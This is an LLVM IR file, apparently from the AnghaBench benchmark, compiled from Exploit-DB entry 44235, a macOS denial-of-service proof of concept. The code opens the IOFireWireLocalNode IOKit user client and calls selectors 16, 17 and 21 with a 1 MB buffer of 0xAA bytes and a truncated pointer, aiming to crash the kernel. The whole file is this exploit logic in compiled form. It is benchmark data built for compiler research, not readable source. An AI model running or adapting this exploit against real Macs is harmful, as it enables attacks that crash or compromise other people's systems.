; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44235.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44235.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"IOFireWireLocalNode\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@KERN_SUCCESS = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [6 x i32], align 16
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  %11 = load i32, i32* @kIOMasterPortDefault, align 4
  %12 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  %13 = call i64 @IOServiceGetMatchingService(i32 %11, i32 %12)
  store i64 %13, i64* %3, align 8
  %14 = load i64, i64* %3, align 8
  %15 = load i64, i64* @IO_OBJECT_NULL, align 8
  %16 = icmp eq i64 %14, %15
  br i1 %16, label %17, label %18

17:                                               ; preds = %0
  store i32 1, i32* %2, align 4
  br label %71

18:                                               ; preds = %0
  %19 = load i64, i64* %3, align 8
  %20 = call i32 (...) @mach_task_self()
  %21 = call i64 @IOServiceOpen(i64 %19, i32 %20, i32 0, i32* %4)
  store i64 %21, i64* %5, align 8
  %22 = load i64, i64* %3, align 8
  %23 = call i32 @IOObjectRelease(i64 %22)
  %24 = load i64, i64* %5, align 8
  %25 = load i64, i64* @KERN_SUCCESS, align 8
  %26 = icmp ne i64 %24, %25
  br i1 %26, label %27, label %28

27:                                               ; preds = %18
  store i32 2, i32* %2, align 4
  br label %71

28:                                               ; preds = %18
  store i32 0, i32* %6, align 4
  store i32 1, i32* %7, align 4
  %29 = load i32, i32* %4, align 4
  %30 = call i64 @IOConnectCallMethod(i32 %29, i32 16, i32* null, i32 0, i32* null, i32 0, i32* %6, i32* %7, i32* null, i32* null)
  store i64 %30, i64* %5, align 8
  %31 = load i64, i64* %5, align 8
  %32 = load i64, i64* @KERN_SUCCESS, align 8
  %33 = icmp ne i64 %31, %32
  br i1 %33, label %34, label %35

34:                                               ; preds = %28
  store i32 3, i32* %2, align 4
  br label %68

35:                                               ; preds = %28
  store i32 1048576, i32* %8, align 4
  %36 = load i32, i32* %8, align 4
  %37 = call i8* @malloc(i32 %36)
  store i8* %37, i8** %9, align 8
  %38 = load i8*, i8** %9, align 8
  %39 = load i32, i32* %8, align 4
  %40 = call i32 @memset(i8* %38, i32 170, i32 %39)
  %41 = getelementptr inbounds [6 x i32], [6 x i32]* %10, i64 0, i64 0
  %42 = load i32, i32* %6, align 4
  store i32 %42, i32* %41, align 4
  %43 = getelementptr inbounds i32, i32* %41, i64 1
  store i32 0, i32* %43, align 4
  %44 = getelementptr inbounds i32, i32* %43, i64 1
  %45 = load i8*, i8** %9, align 8
  %46 = ptrtoint i8* %45 to i32
  store i32 %46, i32* %44, align 4
  %47 = getelementptr inbounds i32, i32* %44, i64 1
  %48 = load i32, i32* %8, align 4
  store i32 %48, i32* %47, align 4
  %49 = getelementptr inbounds i32, i32* %47, i64 1
  store i32 0, i32* %49, align 4
  %50 = getelementptr inbounds i32, i32* %49, i64 1
  store i32 0, i32* %50, align 4
  %51 = load i32, i32* %4, align 4
  %52 = getelementptr inbounds [6 x i32], [6 x i32]* %10, i64 0, i64 0
  %53 = call i64 @IOConnectCallMethod(i32 %51, i32 17, i32* %52, i32 6, i32* null, i32 0, i32* null, i32* null, i32* null, i32* null)
  store i64 %53, i64* %5, align 8
  %54 = load i8*, i8** %9, align 8
  %55 = call i32 @free(i8* %54)
  %56 = load i64, i64* %5, align 8
  %57 = load i64, i64* @KERN_SUCCESS, align 8
  %58 = icmp ne i64 %56, %57
  br i1 %58, label %59, label %60

59:                                               ; preds = %35
  store i32 4, i32* %2, align 4
  br label %68

60:                                               ; preds = %35
  %61 = load i32, i32* %4, align 4
  %62 = call i64 @IOConnectCallMethod(i32 %61, i32 21, i32* %6, i32 1, i32* null, i32 0, i32* null, i32* null, i32* null, i32* null)
  store i64 %62, i64* %5, align 8
  %63 = load i64, i64* %5, align 8
  %64 = load i64, i64* @KERN_SUCCESS, align 8
  %65 = icmp ne i64 %63, %64
  br i1 %65, label %66, label %67

66:                                               ; preds = %60
  store i32 5, i32* %2, align 4
  br label %68

67:                                               ; preds = %60
  br label %68

68:                                               ; preds = %67, %66, %59, %34
  %69 = load i32, i32* %4, align 4
  %70 = call i32 @IOServiceClose(i32 %69)
  br label %71

71:                                               ; preds = %68, %27, %17
  %72 = load i32, i32* %2, align 4
  ret i32 %72
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @IOObjectRelease(i64) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i32*, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @IOServiceClose(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
